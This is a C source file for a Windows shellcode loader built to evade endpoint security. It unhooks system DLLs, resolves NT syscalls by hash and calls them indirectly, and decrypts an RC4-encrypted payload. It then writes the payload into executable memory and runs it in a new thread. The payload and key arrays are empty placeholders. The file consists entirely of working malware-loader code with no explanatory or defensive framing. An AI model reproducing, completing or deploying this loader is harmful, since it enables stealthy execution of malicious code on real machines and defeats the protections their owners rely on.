#include <Windows.h>
#include "Common.h"
#include "Debug.h"

UCHAR ProtectedKey[] = { NULL };

UCHAR Payload[] = { NULL };

// global variable
NTAPI_FUNC g_Nt = { 0 };

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.NtAllocateVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.NtProtectVirtualMemory)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.NtCreateThreadEx)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);
#endif

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.NtWaitForSingleObject)) {
#ifdef DEBUG
		PRINTA("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	PRINTA("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.pSyscallInstAddress);
#endif
	return TRUE;
}

INT main() {

	NTSTATUS	STATUS = NULL;
	PVOID		pAddress = NULL;
	SIZE_T		sSize = sizeof(Payload);
	DWORD		dwOld = NULL;
	HANDLE		hProcess = NtCurrentProcess(),	// local process
		hThread = NULL;

	// 'win32u.dll' contains the ROPs to jump to later 
	LoadLibraryH("win32u");

	if (!IniUnhookIndirectSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Indirect-Syscalls\n");
#endif
		return -1;
	}

	if (!IniUnhookDirectCalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Unhooking Direct-Syscalls\n");
#endif // DEBUG
		return -1;
	}

	if (!InitializeNtSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize The Specified Indirect-Syscalls \n");
#endif
		return -1;
	}

	if (!RefreshAllDlls()) {
#ifdef DEBUG
		PRINTA("[!] RefreshAllDlls Failed\n");
#endif // DEBUG
		return -1;
	}

	Rc4EncryptionViSystemFunc032(ProtectedKey, Payload, KEY_SIZE, sizeof(Payload));

	// allocating memory
	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
#ifdef DEBUG
		PRINTA("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	_memcpy(pAddress, Payload, sizeof(Payload));

	// changing memory protection
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// executing the payload
	SET_SYSCALL(g_Nt.NtCreateThreadEx);
	if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
#endif
		return -1;
	}

	// waiting for the payload
	SET_SYSCALL(g_Nt.NtWaitForSingleObject);
	if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
#ifdef DEBUG
		PRINTA("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
#endif
		return -1;
	}

	return 0;
}

extern VOID* __cdecl memset(VOID*, INT, size_t);
#pragma intrinsic(memset)
#pragma function(memset)
VOID* __cdecl memset(VOID* pTarget, INT value, size_t cbTarget) {
	PUCHAR p = (PUCHAR)pTarget;
	while (cbTarget-- > 0) {
		*p++ = (UCHAR)value;
	}
	return pTarget;
}